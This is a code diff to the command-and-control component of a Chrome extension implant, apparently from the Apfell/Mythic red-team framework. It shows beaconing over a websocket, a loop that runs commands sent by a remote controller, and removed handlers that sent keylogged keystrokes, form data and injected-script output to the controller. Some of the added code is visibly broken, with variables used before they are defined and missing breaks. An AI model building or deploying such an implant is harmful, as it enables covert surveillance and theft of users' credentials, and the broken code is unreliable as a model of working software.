@@ -1,6 +1,7 @@
 //------------- Chrome Extension Websocket C2 mechanisms ---------------------------------
 // Dictionary that holds outbound messages
 let out = [];
+let screencaptures = [];
 class customC2 extends baseC2{
     constructor(host, port, endpoint, ssl , interval){
         super(host, port, endpoint, ssl, interval);
@@ -24,13 +25,23 @@ class customC2 extends baseC2{
     }
 
     checkIn() {
-        const localAddress = '127.0.0.1';
-        const checkInMessage = CreateCallbackCheckInMessage(apfell.userinfo, apfell.uuid, 0, localAddress, 'chrome');
-        const meta = {};
-        meta["metatype"] = 2;
-        meta["metadata"] = checkInMessage;
-        const metaenvelope = JSON.stringify(meta);
-        connection.send(metaenvelope);
+        const msg = {
+            "action":"checkin",
+            "os":"chrome",
+            "user":apfell.userinfo,
+            "uuid":apfell.uuid,
+            "pid":0,
+            "ip":'127.0.0.1',
+        };
+
+        const meta = {
+            "client": true,
+            "data": btoa(unescape(encodeURIComponent(JSON.stringify(msg)))),
+            "tag":"",
+        };
+
+        const encmsg = JSON.stringify(meta);
+        connection.send(encmsg);
         console.log('Sent initial checkin');
     }
 
@@ -38,7 +49,13 @@ class customC2 extends baseC2{
         if (out.length > 0){
             // Pop and send a message to the controller
             const msg = out.shift();
-            connection.send(msg);
+            const meta = {
+                "client":true,
+                "data": msg,
+                "tag": "",
+                "file":{},
+            };
+            connection.send(meta);
         }
     }
 }
@@ -80,45 +97,9 @@ setInterval(function(){
 chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
     // Listen for events from other scripts
     switch (message.type) {
-        case 'keylogger' : {
-            const keydata = {};
-            keydata["user"] = config.username;
-            keydata["keystrokes"] = message.data;
-            keydata['window_title'] = message.window;
-            let mtype = message.data.type;
-            let payload = btoa(unescape(encodeURIComponent(JSON.stringify(keydata))));
-            let envelope = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, message.data.length, keylogTaskID, mtype, payload);
-            const meta = {};
-            meta.type = 3;
-            meta.metadata = envelope;
-            const metaenvelope = JSON.stringify(meta);
-            out.push(metaenvelope);
-            break;
-        }
-        case 'formData' : {
-            const formData = {};
-            formData.user = config.username;
-            formData.keystrokes = message.data;
-            let mtype = message.data.type;
-            let payload = btoa(unescape(encodeURIComponent(JSON.stringify(formData))));
-            let envelope = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, message.data.length, keylogTaskID, mtype, payload);
-            const meta = {};
-            meta.type = 3;
-            meta.metadata = envelope;
-            const metaenvelope = JSON.stringify(meta);
-            out.push(metaenvelope);
-            break;
-        }
-        case 'custom': {
-            // catch output from custom javascript injected into tabs
-            let payload = btoa(unescape(encodeURIComponent(JSON.stringify(message.data))));
-            let mtype = message.data.type;
-            let envelope = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, message.data.length, keylogTaskID, mtype, payload);
-            const meta = {};
-            meta.type = 3;
-            meta.metadata = envelope;
-            const metaenvelope = JSON.stringify(meta);
-            out.push(metaenvelope);
+        
+        case 'screencapture': {
+            // TODO: Chunk screencapture and send
         }
     }
 });
@@ -136,30 +117,41 @@ connection.onerror = function () {
 };
 
 connection.onmessage = function (e) {
-    const message = JSON.parse(e.data);
-
-    switch (message['metatype']) {
-        case 2: {
+    const rawmsg = atob(e.data)
+    var messagenouuid = rawmsg.slice(35, message.length - 1)
+    var message = JSON.parse(messagenouuid)
+    switch (message['action']) {
+        case 'checkin': {
             // callback check in
-            const checkindata = message['metadata'];
-            apfell.apfellid = checkindata['id'];
+            apfell.apfellid = message['id'];
             break;
         }
-        case 3 : {
+        case 'get_tasking' : {
             // handle an apfell message
-            const data = message["metadata"];
-            const taskname = data["taskname"];
 
-            try {
-                C2.commands[taskname](data);
-            } catch (err) {
-                console.log("Error executing task: " + err);
-                const envelope = CreateApfellMessage(2, apfell.apfellid, apfell.uuid, err.length, data['taskid'], data['tasktype'], err);
-                const meta = {};
-                meta.type = 3;
-                meta.metadata = envelope;
-                const metaenvelope = JSON.stringify(meta);
-                out.push(metaenvelope);
+            for (let index = 0; index < message['tasks'].length; index++) { 
+                const task = message['tasks'][index];
+
+                try {
+                    C2.commands[task['command']](task['parameters'])
+                } catch (error) {
+                    console.log("Error executing task: " + err);
+                }
+            }
+        }
+        case 'post_response' : {
+            for (let index = 0; index < message['responses']; index++) {
+                const response = message['responses'][index]; 
+                
+                // check for screencaptures 
+                if (screencaptures.length > 0) {
+                    for (let index = 0; index < screencaptures.length; index++) {
+                        var equal = response['task_id'].localeCompare(screencaptures[index])
+                        if (equal == 0) {
+                            // TODO: chunk the screencapture data
+                        }
+                    }
+                }
             }
         }
     }
